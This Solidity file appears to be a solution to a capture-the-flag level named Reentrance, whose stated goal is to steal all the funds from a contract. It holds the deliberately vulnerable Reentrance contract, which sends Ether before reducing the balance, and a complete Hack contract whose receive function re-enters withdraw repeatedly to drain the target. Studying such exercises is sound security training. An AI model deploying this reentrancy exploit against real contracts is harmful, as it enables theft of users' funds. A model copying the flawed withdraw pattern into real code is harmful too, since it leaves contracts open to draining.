
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';

/**
The goal of this level is for you to steal all the funds from the contract.

  Things that might help:

    Untrusted contracts can execute code where you least expect it.
    Fallback methods
    Throw/revert bubbling
    Sometimes the best way to attack a contract is with another contract.
    See the Help page above, section "Beyond the console"

**/
contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      require(result);
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract Helper {


    function getBalance(address _add) public view returns(uint) {
        return _add.balance;
    }

    function sendMoney(address _add) public payable {
        (bool success,) = _add.call{value: msg.value}("");
        require(success);
    }

}

interface ReentranceI {
    function withdraw(uint _amount) external;
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint balance);
    receive() external payable;
}

contract Hack {

    ReentranceI deposit_contract;

    uint attackAmount; 

    uint target_value = 0.001 ether;

    constructor(address payable _add)  {
        deposit_contract = ReentranceI(_add);
    }

    function deposit() public payable {
       require(msg.value >= target_value, "Should be >= 100");
        deposit_contract.donate{value: msg.value}(address(this));
    }
    
    function attack() public payable {
        require(msg.value >= target_value);
        deposit_contract.donate{value: msg.value}(address(this));
        deposit_contract.withdraw(msg.value);
    }
    
    function withdraw(uint amount) public {
        deposit_contract.withdraw(amount);
    }

    function checkDonated() public view returns(uint) {
        return deposit_contract.balanceOf(address(this));
    }

    function checkBalance() public view returns(uint) {
        return address(this).balance;
    }

    function checkBalanceDep() public view returns(uint) {
        return address(deposit_contract).balance;
    }

    // Function to receive Ether. msg.data must be empty
    receive() external payable {
      uint target_balance = address(deposit_contract).balance;
      if (target_balance >= target_value) {
        deposit_contract.withdraw(target_value);
      }
    }

}
